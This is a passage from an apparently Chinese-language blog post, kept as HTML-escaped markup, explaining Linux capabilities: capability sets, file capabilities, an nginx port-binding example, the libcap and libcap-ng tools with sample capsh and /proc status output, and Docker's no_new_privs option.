&lt;td style=&#34;text-align:left&#34;&gt;CAP_MKNOD&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;允许使用 mknod () 系统调用&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;CAP_NET_ADMIN&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;允许执行网络管理任务&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;CAP_NET_BIND_SERVICE&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;允许绑定到小于 1024 的端口&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;CAP_NET_BROADCAST&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;允许网络广播和多播访问&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;CAP_NET_RAW&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;允许使用原始套接字&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;CAP_SETGID&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;允许改变进程的 GID&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;CAP_SETFCAP&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;允许为文件设置任意的 capabilities&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;CAP_SETPCAP&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;参考 capabilities man page&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;CAP_SETUID&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;允许改变进程的 UID&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;CAP_SYS_ADMIN&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;允许执行系统管理任务，如加载或卸载文件系统、设置磁盘配额等&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;CAP_SYS_BOOT&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;允许重新启动系统&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;CAP_SYS_CHROOT&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;允许使用 chroot () 系统调用&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;CAP_SYS_MODULE&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;允许插入和删除内核模块&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;CAP_SYS_NICE&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;允许提升优先级及设置其他进程的优先级&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;CAP_SYS_PACCT&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;允许执行进程的 BSD 式审计&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;CAP_SYS_PTRACE&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;允许跟踪任何进程&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;CAP_SYS_RAWIO&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;允许直接访问 /devport、/dev/mem、/dev/kmem 及原始块设备&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;CAP_SYS_RESOURCE&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;忽略资源限制&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;CAP_SYS_TIME&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;允许改变系统时钟&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;CAP_SYS_TTY_CONFIG&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;允许配置 TTY 设备&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;CAP_SYSLOG&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;允许使用 syslog () 系统调用&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:left&#34;&gt;CAP_WAKE_ALARM&lt;/td&gt;
&lt;td style=&#34;text-align:left&#34;&gt;允许触发一些能唤醒系统的东西 (比如 CLOCK_BOOTTIME_ALARM 计时器)&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;docker 逃逸一般是因为 &lt;code&gt;cap_sys_module&lt;/code&gt;  或者 &lt;code&gt;CAP_SYS_ADMIN&lt;/code&gt;  权限的问题&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;capabilities 的赋予和继承&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Linux capabilities 分为进程 capabilities 和文件 capabilities。对于进程来说，capabilities 是细分到线程的，即每个线程可以有自己的 capabilities。对于文件来说，capabilities 保存在文件的扩展属性中。&lt;/p&gt;
&lt;p&gt;每一个线程，具有 5 个 capabilities 集合，每一个集合使用  &lt;code&gt;64&lt;/code&gt;  位掩码来表示，显示为  &lt;code&gt;16&lt;/code&gt;  进制格式。这 5 个 capabilities 集合分别是：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Permitted&lt;/li&gt;
&lt;li&gt;Effective&lt;/li&gt;
&lt;li&gt;Inheritable&lt;/li&gt;
&lt;li&gt;Bounding&lt;/li&gt;
&lt;li&gt;Ambient&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;Permitted&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;定义了线程能够使用的 capabilities 的上限。线程添加或删除 capability，前提是添加或删除的 capability 必须包含在  &lt;code&gt;Permitted&lt;/code&gt;  集合中&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Effective&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;内核检查线程是否可以进行特权操作时，检查的对象便是  &lt;code&gt;Effective&lt;/code&gt;  集合。如之前所说， &lt;code&gt;Permitted&lt;/code&gt;  集合定义了上限，线程可以删除 Effective 集合中的某 capability，随后在需要时，再从 Permitted 集合中恢复该 capability，以此达到临时禁用 capability 的功能。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Inheritable&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;当执行 &lt;code&gt;exec()&lt;/code&gt;  系统调用时，能够被新的可执行文件继承的 capabilities，被包含在  &lt;code&gt;Inheritable&lt;/code&gt;  集合中。&lt;/p&gt;
&lt;p&gt;Bounding 和 Ambient 不在赘述，用的不多，可以去下面的参考链接了解&lt;/p&gt;
&lt;p&gt;文件的 capabilities&lt;/p&gt;
&lt;p&gt;文件的 capabilities 被保存在文件的扩展属性中。如果想修改这些属性，需要具有  &lt;code&gt;CAP_SETFCAP&lt;/code&gt;  的 capability。&lt;/p&gt;
&lt;p&gt;类似于线程的 capabilities，文件的 capabilities 包含了 3 个集合：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Permitted&lt;/li&gt;
&lt;li&gt;Inheritable&lt;/li&gt;
&lt;li&gt;Effective&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;最后举个 docker 的例子，在开始的时候提过 nginx 的特殊性&lt;/p&gt;
&lt;p&gt;使用普通用户启动时会报以下错误&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;bind() to 0.0.0.0:80 failed (13: Permission denied)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;因为 nginx 进程的  &lt;code&gt;Effective&lt;/code&gt;  集合中不包含  &lt;code&gt;CAP_NET_BIND_SERVICE&lt;/code&gt;  capability，且不具有 &lt;strong&gt;capabilities 意识&lt;/strong&gt;（普通用户），所以启动失败。要想启动成功，至少需要将该 capability 添加到 nginx 文件的  &lt;code&gt;Inheritable&lt;/code&gt;  集合中，同时开启 Effective 标志位，并且在 Kubernetes Pod 的部署清单中的 securityContext --&amp;gt; capabilities 字段下面添加  &lt;code&gt;NET_BIND_SERVICE&lt;/code&gt; （这个 capability 会被添加到 nginx 进程的  &lt;code&gt;Bounding&lt;/code&gt;  集合中），最后还要将 capability 添加到 nginx 文件的  &lt;code&gt;Permitted&lt;/code&gt;  集合中。&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xNTI5MzQy&#34;&gt;Linux Capabilities 入门：让普通进程获得 root 的洪荒之力 - 腾讯云开发者社区 - 腾讯云 (tencent.com)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Linux 系统中主要提供了两种工具来管理 capabilities： &lt;code&gt;libcap&lt;/code&gt;  和  &lt;code&gt;libcap-ng&lt;/code&gt; 。 &lt;code&gt;libcap&lt;/code&gt;  提供了  &lt;code&gt;getcap&lt;/code&gt;  和  &lt;code&gt;setcap&lt;/code&gt;  两个命令来分别查看和设置文件的 capabilities，同时还提供了  &lt;code&gt;capsh&lt;/code&gt;  来查看当前 shell 进程的 capabilities。 &lt;code&gt;libcap-ng&lt;/code&gt;  更易于使用，使用同一个命令  &lt;code&gt;filecap&lt;/code&gt;  来查看和设置 capabilities。&lt;/p&gt;
&lt;p&gt;1.libcap&lt;/p&gt;
&lt;p&gt;// 安装 libcap&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;yum install -y libcap&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;如果想查看当前 shell 进程的 capabilities，可以用  &lt;code&gt;capsh&lt;/code&gt;  命令。下面是 CentOS 系统中的 root 用户执行  &lt;code&gt;capsh&lt;/code&gt;  的输出：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[root@hecs-346515 ~]# capsh --print&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,35,36+ep&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,35,36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Securebits: 00/0x0/1&amp;#x27;b0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; secure-noroot: no (unlocked)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; secure-no-suid-fixup: no (unlocked)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; secure-keep-caps: no (unlocked)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;uid=0(root)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gid=0(root)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;groups=0(root)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Current&lt;/strong&gt; : 表示当前 shell 进程的 Effective capabilities 和 Permitted capabilities。可以包含多个分组，每一个分组的表示形式为  &lt;code&gt;capability[,capability…]+(e|i|p)&lt;/code&gt; ，其中  &lt;code&gt;e&lt;/code&gt;  表示 effective， &lt;code&gt;i&lt;/code&gt;  表示 inheritable， &lt;code&gt;p&lt;/code&gt;  表示 permitted。不同的分组之间通过空格隔开，例如： &lt;code&gt;Current: = cap_sys_chroot+ep cap_net_bind_service+eip&lt;/code&gt; 。再举一个例子， &lt;code&gt;cap_net_bind_service+e cap_net_bind_service+ip&lt;/code&gt;  和  &lt;code&gt;cap_net_bind_service+eip&lt;/code&gt;  等价。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Bounding set&lt;/strong&gt; : 这里仅仅表示 Bounding 集合中的 capabilities，不包括其他集合，所以分组的末尾不用加上  &lt;code&gt;+...&lt;/code&gt;  。&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;p&gt;这个命令输出的信息比较有限，完整的信息可以查看 /proc 文件系统，比如当前 shell 进程就可以查看  &lt;code&gt;/proc/$$/status&lt;/code&gt; 。其中一个重要的状态就是  &lt;code&gt;NoNewPrivs&lt;/code&gt; ，可以通过以下命令查看：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[root@hecs-346515 ~]# cat /proc/$$/status &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Name:	bash&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Umask:	0022&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;State:	S (sleeping)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Tgid:	15482&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Ngid:	0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Pid:	15482&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PPid:	15480&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;TracerPid:	0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Uid:	0	0	0	0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Gid:	0	0	0	0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;FDSize:	256&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Groups:	0 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;VmPeak:	  115548 kB&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;VmSize:	  115548 kB&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;VmLck:	       0 kB&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;VmPin:	       0 kB&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;VmHWM:	    2096 kB&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;VmRSS:	    2096 kB&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;RssAnon:	     432 kB&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;RssFile:	    1664 kB&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;RssShmem:	       0 kB&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;VmData:	     368 kB&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;VmStk:	     132 kB&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;VmExe:	     888 kB&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;VmLib:	    2148 kB&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;VmPTE:	      52 kB&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;VmSwap:	       0 kB&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Threads:	1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;SigQ:	0/7268&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;SigPnd:	0000000000000000&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ShdPnd:	0000000000000000&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;SigBlk:	0000000000010000&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;SigIgn:	0000000000384004&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;SigCgt:	000000004b813efb&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;CapInh:	0000000000000000&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;CapPrm:	0000001fffffffff&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;CapEff:	0000001fffffffff&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;CapBnd:	0000001fffffffff&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;CapAmb:	0000000000000000&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;NoNewPrivs:	0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Seccomp:	0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Speculation_Store_Bypass:	thread vulnerable&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Cpus_allowed:	1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Cpus_allowed_list:	0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Mems_allowed:	00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000000,00000001&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Mems_allowed_list:	0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;voluntary_ctxt_switches:	90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nonvoluntary_ctxt_switches:	0&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;自从 Linux 4.10 开始， &lt;code&gt;/proc/[pid]/status&lt;/code&gt;  中的  &lt;code&gt;NoNewPrivs&lt;/code&gt;  值表示了线程的  &lt;code&gt;no_new_privs&lt;/code&gt;  属性。&lt;/p&gt;
&lt;p&gt;一般情况下， &lt;code&gt;execve()&lt;/code&gt;  系统调用能够赋予新启动的进程其父进程没有的权限，最常见的例子就是通过  &lt;code&gt;setuid&lt;/code&gt;  和  &lt;code&gt;setgid&lt;/code&gt;  来设置程序进程的 uid 和 gid 以及文件的访问权限。&lt;/p&gt;
&lt;p&gt;开启了  &lt;code&gt;no_new_privs&lt;/code&gt;  之后，execve 函数可以确保所有操作都必须调用  &lt;code&gt;execve()&lt;/code&gt;  判断并赋予权限后才能被执行。这就确保了线程及子线程都无法获得额外的权限，因为无法执行 setuid 和 setgid，也不能设置文件的权限。&lt;/p&gt;
&lt;p&gt;一旦当前线程的  &lt;code&gt;no_new_privs&lt;/code&gt;  被置位后，不论通过 fork，clone 或 execve 生成的子线程都无法将该位清零。&lt;/p&gt;
&lt;p&gt;Docker 中可以通过参数  &lt;code&gt;--security-opt&lt;/code&gt;  来开启  &lt;code&gt;no_new_privs&lt;/code&gt;  属性，例如： &lt;code&gt;docker run --security-opt=no_new_privs busybox&lt;/code&gt; 。&lt;/p&gt;
&lt;p&gt;2.libcap-ng&lt;/p&gt;
&lt;p&gt;// 安装&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;yum install libcap-ng-utils&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;libcap-ng 使用  &lt;code&gt;filecap&lt;/code&gt;  命令来管理文件的 capabilities。&lt;/p&gt;
&lt;p&gt;查看文件的 capabilities：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ filecap /full/path/to/file&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;递归查看某个目录下所有文件的 capabilities：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$ filecap /full/path/to/dir&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;[Linux Capabilities 入门教程：基础实战篇 - 菜鸟教程 | &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL0Jvb3RXaWtpLmNvbQ==&#34;&gt;BootWiki.com&lt;/span&gt;](&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuYm9vdHdpa2kuY29tL25vdGUvMjA4MDAuaHRtbCM6fjp0ZXh0PSUyNA==&#34;&gt;https://www.bootwiki.com/note/20800.html#:~:text=%24&lt;/span&gt; yum install -y libcap 如果想查看当前 shell 进程的，命令。 下面是 CentOS 系统中的 root 用户执行 capsh 的输出：)&lt;/p&gt;
